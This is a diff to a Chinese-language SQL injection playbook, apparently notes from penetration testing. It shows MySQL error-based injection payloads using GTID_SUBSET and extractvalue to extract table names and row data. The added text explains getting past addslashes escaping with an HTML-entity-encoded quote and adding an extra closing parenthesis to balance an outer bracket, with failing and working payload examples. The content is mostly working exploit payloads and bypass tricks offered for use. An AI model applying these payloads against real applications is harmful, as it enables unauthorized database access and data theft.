@@ -99,6 +99,8 @@ x'||GTID_SUBSET((select table_name From Mysql.innodb_table_stats limit 0,1),1))-
 x'||GTID_SUBSET((select group_concat(id,title) From (select id,title From tbl limit 0,2) t2),1))-- -
 ```
 
+> **提交形态**：上面写 `x'` 是**解码后**的等价 SQL。本次目标字面 `'` 会被 `addslashes` 正确转义（照抄字面形式只会看到"无报错"），实际发送的是 **`x&#39;||extractvalue(...)`** —— 见 `encoding-charset-boundary.md` §4.4。
+
 **⚠️ 括号配平（实测踩过的坑）**：注入点**可能带一层外层括号**（本次是 `and (t.title like '%<skey>%')`），此时 payload 的 `--` 注释会**把末尾的 `)` 一起注释掉** → 必须**自己多补一个 `)`** 闭合外层。**判据**：报 `You have an error in your SQL syntax ... near ''`（末尾空）而非预期的函数报错，就说明括号没配平。
 - ❌ `...||extractvalue(1,version())-- -` → 外层 `(` 未闭合 → `You have an error in your SQL syntax ... near ''`
 - ✅ `...||extractvalue(1,version()))-- -` → 正常回显
